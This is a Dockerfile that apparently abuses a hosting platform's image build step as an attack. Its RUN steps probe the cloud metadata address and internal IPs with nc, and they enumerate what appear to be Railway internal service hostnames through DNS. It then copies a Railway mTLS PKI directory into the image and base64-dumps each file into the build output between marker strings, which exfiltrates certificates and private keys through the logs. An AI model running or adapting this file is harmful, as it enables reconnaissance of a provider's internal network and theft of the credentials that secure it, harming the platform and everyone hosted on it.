FROM alpine:3.20
RUN echo "===I73334_NET_BEGIN==="; hostname; echo "---resolv---"; cat /etc/resolv.conf 2>&1; echo "---hosts---"; cat /etc/hosts 2>&1; echo "---uname---"; uname -a 2>&1; echo "---nc---"; for t in 1.1.1.1:443 8.8.8.8:53 169.254.169.254:80 169.254.169.254:53 10.10.10.177:443 10.10.10.158:8480 10.10.10.198:8481 100.86.65.68:443; do h=${t%:*}; p=${t#*:}; timeout 3 nc -w 2 "$h" "$p" </dev/null >/dev/null 2>&1; echo "NC $t rc=$?"; done; echo "---dns---"; for n in orchestrator.railway.internal temporal.railway.internal backboard.railway.internal pg-bouncer.railway.internal stacker.railway.internal storage-cp.railway.internal network-cp.railway.internal metal-cp.railway.internal registry.railway.internal vminsert.railway.internal nats.railway.internal railway.internal; do printf '%s => ' "$n"; nslookup "$n" 2>&1 | tail -n 4 | tr '\n' '|'; echo; done; echo "===I73334_NET_END==="
COPY var/lib/railwayapp/mtls-pki /o/pki
RUN echo "===I73334_PKI_BEGIN==="; ls -laR /o/pki 2>&1 | head -80; for f in /o/pki/*; do echo "FILE:$f"; head -c 30000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_PKI_END==="
